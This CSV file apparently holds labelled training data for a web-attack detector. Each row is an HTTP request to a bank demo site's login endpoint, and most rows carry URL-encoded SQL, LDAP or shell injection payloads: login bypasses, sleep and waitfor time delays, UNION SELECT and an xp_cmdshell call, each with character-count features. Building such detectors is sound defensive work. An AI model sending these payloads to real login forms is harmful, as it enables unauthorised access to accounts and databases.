method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
,,,,,,,,,
GET,/bank/main.jsp,,0,0,0,0,0,0,bad
,,,,,,,,,
GET,/login.jsp,,0,0,0,0,0,0,bad
,,,,,,,,,
POST,/doLogin,uid=%22%26%22&passw=dv&btnSubmit=Login,0,2,0,0,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%22%29%29%3Bwaitfor+delay+%270%3A0%3A__TIME__%27--&passw=asf&btnSubmit=Login,2,1,1,0,0,3,bad
,,,,,,,,,
POST,/doLogin,uid=%22%29%29%3Bwaitfor+delay+%270%3A0%3A__TIME__%27--&passw=sf&btnSubmit=Login,2,1,1,0,0,3,bad
,,,,,,,,,
POST,/doLogin,uid=%22%29%29+or+%28%28%22x%22%29%29%3D%28%28%22x&passw=as&btnSubmit=Login,0,4,0,4,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%22%29%29+or+benchmark%2810000000%2CMD5%281%29%29%23&passw=af&btnSubmit=Login,0,1,0,2,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%22%29%29+or+pg_sleep%28__TIME__%29--&passw=adc&btnSubmit=Login,0,1,1,1,0,2,bad
,,,,,,,,,
POST,/doLogin,uid=%22%29%29+or+pg_sleep%28__TIME__%29--&passw=af&btnSubmit=Login,0,1,1,1,0,2,bad
,,,,,,,,,
POST,/doLogin,uid=%22%29%29+or+pg_sleep%28__TIME__%29--&passw=asc&btnSubmit=Login,0,1,1,1,0,2,bad
,,,,,,,,,
POST,/doLogin,uid=%22%29%29+or+sleep%28__TIME__%29%3D%22&passw=AEFEF&btnSubmit=Login,0,2,0,1,0,2,bad
,,,,,,,,,
POST,/doLogin,uid=%22%29%29+or+sleep%28__TIME__%29%3D%22&passw=ad&btnSubmit=Login,0,2,0,1,0,2,bad
,,,,,,,,,
POST,/doLogin,uid=%22%29%3Bwaitfor+delay+%270%3A0%3A__TIME__%27--&passw=as&btnSubmit=Login,2,1,1,0,0,3,bad
,,,,,,,,,
POST,/doLogin,uid=%22%29+or+%28%22x%22%29%3D%28%22x&passw=asv&btnSubmit=Login,0,4,0,2,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%22%29+or+benchmark%2810000000%2CMD5%281%29%29%23&passw=ad&btnSubmit=Login,0,1,0,2,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%22%29+or+pg_sleep%28__TIME__%29--&passw=as&btnSubmit=Login,0,1,1,1,0,2,bad
,,,,,,,,,
POST,/doLogin,uid=%22%29+or+pg_sleep%28__TIME__%29--&passw=sfsef&btnSubmit=Login,0,1,1,1,0,2,bad
,,,,,,,,,
POST,/doLogin,uid=%22%29+or+sleep%28__TIME__%29%3D%22&passw=efweg&btnSubmit=Login,0,2,0,1,0,2,bad
,,,,,,,,,
POST,/doLogin,uid=%22%29+or+sleep%28__TIME__%29%3D%22&passw=gn&btnSubmit=Login,0,2,0,1,0,2,bad
,,,,,,,,,
POST,/doLogin,uid=%22%29+or+sleep%28__TIME__%29%3D%22&passw=sgre&btnSubmit=Login,0,2,0,1,0,2,bad
,,,,,,,,,
POST,/doLogin,uid=%22%29+or+true--+%27%29+or+true--&passw=ac&btnSubmit=Login,1,1,2,0,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%22%3Bwaitfor+delay+%270%3A0%3A__TIME__%27--&passw=SAFASD&btnSubmit=Login,2,1,1,0,0,3,bad
,,,,,,,,,
POST,/doLogin,uid=%22%3Bwaitfor+delay+%270%3A0%3A__TIME__%27--&passw=aef&btnSubmit=Login,2,1,1,0,0,3,bad
,,,,,,,,,
POST,/doLogin,uid=%22*%22&passw=adv&btnSubmit=Login,0,2,0,0,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%22+%22&passw=adv&btnSubmit=Login,0,2,0,0,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%22+or+%22%22%26%22&passw=%22+or+%22%22%26%22&btnSubmit=Login,0,8,0,0,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%22+or+%22%22%5E%22&passw=ac&btnSubmit=Login,0,4,0,0,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%22+or+%22%22*%22&passw=asc&btnSubmit=Login,0,4,0,0,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%22+or+%22%22-%22&passw=dv&btnSubmit=Login,0,4,0,0,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%22+or+%22a%22%3D%22a&passw=as&btnSubmit=Login,0,4,0,0,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%22+or+%22a%22%3D%22a&passw=sd&btnSubmit=Login,0,4,0,0,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%22+or+%22x%22%3D%22x&passw=asc&btnSubmit=Login,0,4,0,0,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%22+or+1%3D1--&passw=as&btnSubmit=Login,0,1,1,0,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%22+or+benchmark%2810000000%2CMD5%281%29%29%23&passw=asf&btnSubmit=Login,0,1,0,2,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%22+or+isNULL%281%2F0%29+%2F*&passw=ef&btnSubmit=Login,0,1,0,1,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%22+or+pg_sleep%28__TIME__%29--&passw=efa&btnSubmit=Login,0,1,1,1,0,2,bad
,,,,,,,,,
POST,/doLogin,uid=%22+or+pg_sleep%28__TIME__%29--&passw=sfasf&btnSubmit=Login,0,1,1,1,0,2,bad
,,,,,,,,,
POST,/doLogin,uid=%22+or+sleep%28__TIME__%29%23&passw=af&btnSubmit=Login,0,1,0,1,0,2,bad
,,,,,,,,,
POST,/doLogin,uid=%22+or+sleep%28__TIME__%29%23&passw=kjksefg&btnSubmit=Login,0,1,0,1,0,2,bad
,,,,,,,,,
POST,/doLogin,uid=%22+or+sleep%28__TIME__%29%3D%22&passw=efweg&btnSubmit=Login,0,2,0,1,0,2,bad
,,,,,,,,,
POST,/doLogin,uid=%22+or+true--&passw=dav&btnSubmit=Login,0,1,1,0,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%22-%22&passw=adv&btnSubmit=Login,0,2,0,0,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%22a%22%22+or+1%3D1--%22&passw=a&btnSubmit=Login,0,4,1,0,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%22a%22%22+or+3%3D3--%22&passw=asf&btnSubmit=Login,0,4,1,0,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%22hi%22%22%29+or+%28%22%22a%22%22%3D%22%22a%22&passw=asd&btnSubmit=Login,0,10,0,1,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%2520%24%28sleep%252050%29&passw=af&btnSubmit=Login,0,0,0,1,0,2,bad
,,,,,,,,,
POST,/doLogin,uid=%2520%27sleep%252050%27&passw=aef&btnSubmit=Login,2,0,0,0,0,2,bad
,,,,,,,,,
POST,/doLogin,uid=%2520or%2520%27%27%3D%27&passw=a&btnSubmit=Login,3,0,0,0,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%2520or%2520%27x%27%3D%27x&passw=ad&btnSubmit=Login,3,0,0,0,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%2520or%25201%3D1&passw=sf&btnSubmit=Login,0,0,0,0,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%2520or%2520x%3Dx&passw=ad&btnSubmit=Login,0,0,0,0,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%2527%2520or%25201%3D1&passw=as&btnSubmit=Login,0,0,0,0,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%252A%2528%257C%2528objectclass%253D%252A%2529%2529&passw=af&btnSubmit=Login,0,0,0,0,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%27%26%27&passw=c&btnSubmit=Login,2,0,0,0,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%27%29%29+or+%28%28%27x%27%29%29%3D%28%28%27x&passw=adv&btnSubmit=Login,4,0,0,4,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%27%29%29+or+pg_sleep%28__TIME__%29--&passw=fea&btnSubmit=Login,1,0,1,1,0,2,bad
,,,,,,,,,
POST,/doLogin,uid=%27%29%29+or+sleep%28__TIME__%29%3D%27&passw=WFAE&btnSubmit=Login,2,0,0,1,0,2,bad
,,,,,,,,,
POST,/doLogin,uid=%27%29%3Bwaitfor+delay+%270%3A0%3A__TIME__%27--&passw=Wf&btnSubmit=Login,3,0,1,0,0,3,bad
,,,,,,,,,
POST,/doLogin,uid=%27%29+or+%28%27a%27%3D%27a&passw=h&btnSubmit=Login,4,0,0,1,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%27%29+or+%28%27x%27%29%3D%28%27x&passw=sf&btnSubmit=Login,4,0,0,2,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%27%29+or+pg_sleep%28__TIME__%29--&passw=afae&btnSubmit=Login,1,0,1,1,0,2,bad
,,,,,,,,,
POST,/doLogin,uid=%27%29+or+sleep%28__TIME__%29%3D%27&passw=asefEF&btnSubmit=Login,2,0,0,1,0,2,bad
,,,,,,,,,
POST,/doLogin,uid=%27%3B+exec+master..xp_cmdshell&passw=asf&btnSubmit=Login,1,0,0,0,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%27%3Bwaitfor+delay+%270%3A0%3A__TIME__%27--&passw=WQQFE&btnSubmit=Login,3,0,1,0,0,3,bad
,,,,,,,,,
POST,/doLogin,uid=%27%5E%27&passw=cs&btnSubmit=Login,2,0,0,0,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%27+%27&passw=asc&btnSubmit=Login,2,0,0,0,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%27+%28select+top+1&passw=sac&btnSubmit=Login,1,0,0,1,0,2,bad
,,,,,,,,,
POST,/doLogin,uid=%27+UNION+ALL+SELECT&passw=sa&btnSubmit=Login,1,0,0,0,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%27+UNION+SELECT&passw=asc&btnSubmit=Login,1,0,0,0,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%27+or+%27%27%26%27&passw=dsv&btnSubmit=Login,4,0,0,0,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%27+or+%27%27%3D%27&passw=asc&btnSubmit=Login,4,0,0,0,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%27+or+%27%27%5E%27&passw=adc&btnSubmit=Login,4,0,0,0,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%27+or+%27%27*%27&passw=dv&btnSubmit=Login,4,0,0,0,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%27+or+%27%27+%27&passw=asc&btnSubmit=Login,4,0,0,0,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%27+or+%27%27-%27&passw=asc&btnSubmit=Login,4,0,0,0,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%27+or+%271%27%3D%271%27--&passw=hb&btnSubmit=Login,5,0,1,0,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%27+or+%27x%27%3D%27x&passw=ad&btnSubmit=Login,4,0,0,0,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%27+or+%28EXISTS%29&passw=sc&btnSubmit=Login,1,0,0,1,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%27+or+1%3D1&passw=X&btnSubmit=Login,1,0,0,0,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%27+or+1%3D1+or+%27%27%3D%27&passw=hj&btnSubmit=Login,4,0,0,0,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%27+or+1%3D1--&passw=hb&btnSubmit=Login,1,0,1,0,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%27+or+1+--%27&passw=hb&btnSubmit=Login,2,0,1,0,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%27+or+3%3D3&passw=asc&btnSubmit=Login,1,0,0,0,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%27+or+a%3Da--&passw=jh&btnSubmit=Login,1,0,1,0,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%27+or+pg_sleep%28__TIME__%29--&passw=asfa&btnSubmit=Login,1,0,1,1,0,2,bad
,,,,,,,,,
POST,/doLogin,uid=%27+or+sleep%28__TIME__%29%23&passw=ewwergrg&btnSubmit=Login,1,0,0,1,0,2,bad
,,,,,,,,,
POST,/doLogin,uid=%27+or+sleep%28__TIME__%29%3D%27&passw=wer&btnSubmit=Login,2,0,0,1,0,2,bad
,,,,,,,,,
POST,/doLogin,uid=%27+or+true--&passw=ac&btnSubmit=Login,1,0,1,0,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%27+or+uid+like+%27%25&passw=a&btnSubmit=Login,2,0,0,0,0,2,bad
,,,,,,,,,
POST,/doLogin,uid=%27+or+uname+like+%27%25&passw=ef&btnSubmit=Login,2,0,0,0,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%27+or+uname+like+%27%25&passw=jh&btnSubmit=Login,2,0,0,0,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%27+or+user+like+%27%25&passw=asc&btnSubmit=Login,2,0,0,0,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%27+or+username+like+%27%25&passw=n&btnSubmit=Login,2,0,0,0,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%27-%27&passw=adc&btnSubmit=Login,2,0,0,0,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%27hi%27+or+%27x%27%3D%27x%27%3B&passw=j&btnSubmit=Login,6,0,0,0,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%28%7C%7C6%29&passw=asf&btnSubmit=Login,0,0,0,1,0,1,bad
,,,,,,,,,
POST,/doLogin,uid=%28select+top+1&passw=as&btnSubmit=Login,0,0,0,1,0,2,bad
